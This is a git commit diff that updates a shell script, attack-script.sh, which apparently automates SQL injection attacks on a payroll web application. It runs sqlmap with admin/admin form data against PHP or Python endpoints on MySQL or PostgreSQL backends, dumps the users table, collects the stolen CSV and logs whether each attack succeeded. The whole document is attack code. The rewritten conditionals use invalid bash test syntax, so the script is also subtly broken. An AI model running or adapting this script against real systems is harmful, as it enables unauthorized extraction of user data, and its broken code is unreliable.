29724707e83a781b6b86eccb60433ed10200ca83
Harrison Pratt <hpratt99@gmail.com>
2020-04-07 16:50:58 -0500

    update attack

--- attack-script.sh
+++ attack-script.sh
@@ -2,31 +2,55 @@ TARGET=$1
 DATABASE=$2
 SERVER=$3
 
-if [ $SERVER == "php" ]
+if [ ($DATABASE == "mysql") && ($SERVER == "php") ]
 then 
-	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump 
+	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=MySQL --dump 
 	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/
 	FILE=~/users.csv
 	if test -f "$FILE"
 	then
-		echo "$(date)   -->    $DATABASE, PHP  -->   Attack Successful" >> ~/attack-log.txt
+		echo "$(date)   -->    MySQL, PHP  -->   Attack Successful" >> ~/attack-log.txt
 	else
-		echo "$(date)   -->    $DATABASE, PHP  -->   Attack Failed" >> ~/attack-log.txt
+		echo "$(date)   -->    MySQL, PHP  -->   Attack Failed" >> ~/attack-log.txt
 	fi
 	rm ~/users.csv
-elif [ $SERVER == "python" ]
+elif [ ($DATABASE == "postgresql") && ($SERVER == "php") ]
 then
-	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=$DATABASE --dump 
+	sqlmap -u http://$TARGET/payroll_app.php --data="user=admin&password=admin&s=OK" --dbms=postgresql --dump 
 	FILE=~/users.csv
 	mv ~/.sqlmap/output/$TARGET/dump/public/users.csv ~/ 
 	if test -f "$FILE"
 	then
-		echo "$(date)   -->    $DATABASE, Python  -->   Attack Successful" >> ~/attack-log.txt
+		echo "$(date)   -->    Postgresql, PHP  -->   Attack Successful" >> ~/attack-log.txt
 	else
-		echo "$(date)   -->    $DATABASE, Python  -->   Attack Failed" >> ~/attack-log.txt
+		echo "$(date)   -->    Postgresql, PHP  -->   Attack Failed" >> ~/attack-log.txt
+	fi
+	rm ~/users.csv
+elif [ ($DATABASE == "mysql") && ($SERVER == "python") ]
+then
+	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=MySQL --dump 
+	FILE=~/users.csv
+	mv ~/.sqlmap/output/$TARGET/dump/payroll/users.csv ~/ 
+	if test -f "$FILE"
+	then
+		echo "$(date)   -->    MySQL, Python  -->   Attack Successful" >> ~/attack-log.txt
+	else
+		echo "$(date)   -->    MySQL, Python  -->   Attack Failed" >> ~/attack-log.txt
+	fi
+	rm ~/users.csv
+elif [ ($DATABASE == "postgresql") && ($SERVER == "python") ]
+then
+	sqlmap -u http://$TARGET/cgi-bin/payroll_app.py --data="user=admin&password=admin&s=OK" --dbms=postgresql --dump 
+	FILE=~/users.csv
+	mv ~/.sqlmap/output/$TARGET/dump/public/users.csv ~/ 
+	if test -f "$FILE"
+	then
+		echo "$(date)   -->    Postgresql, Python  -->   Attack Successful" >> ~/attack-log.txt
+	else
+		echo "$(date)   -->    Postgresql, Python  -->   Attack Failed" >> ~/attack-log.txt
 	fi
 	rm ~/users.csv
 else
-	echo "Not valid."
+	echo "Not a valid configuration."
 fi
 
